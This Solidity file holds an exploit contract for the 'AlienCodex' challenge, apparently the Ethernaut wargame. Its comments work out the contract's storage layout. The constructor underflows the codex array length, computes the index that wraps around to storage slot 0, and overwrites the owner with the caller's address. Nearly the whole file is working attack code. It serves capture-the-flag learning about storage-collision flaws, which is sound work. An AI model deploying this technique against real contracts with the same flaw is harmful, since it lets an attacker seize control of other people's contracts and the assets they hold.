// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IAlienCodex {
    function makeContact() external;
    function record(bytes32) external;
    function retract() external;
    function revise(uint256, bytes32) external;
    function owner() external returns (address);
}

contract AlienCodexCaller {
    error AlienCodexCaller__NotOwner();
    /*
    storage
    slot 0 - owner (20 bytes), contact (1 byte)
    slot 1 - length of the array codex

    // slot where array element is stored = keccak256(slot)) + index
    // h = keccak256(1)
    slot h + 0 - codex[0]
    slot h + 1 - codex[1]
    slot h + 2 - codex[2]
    slot h + 3 - codex[3]

    Find i such that
    slot h + i = slot 0
    h + i = 0 so i = 0 - h
    */

    constructor(IAlienCodex alienCodex) {
        alienCodex.makeContact();
        alienCodex.retract();

        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i;
        unchecked {
            i -= h;
        }

        alienCodex.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(alienCodex.owner() == msg.sender, AlienCodexCaller__NotOwner());
    }
}
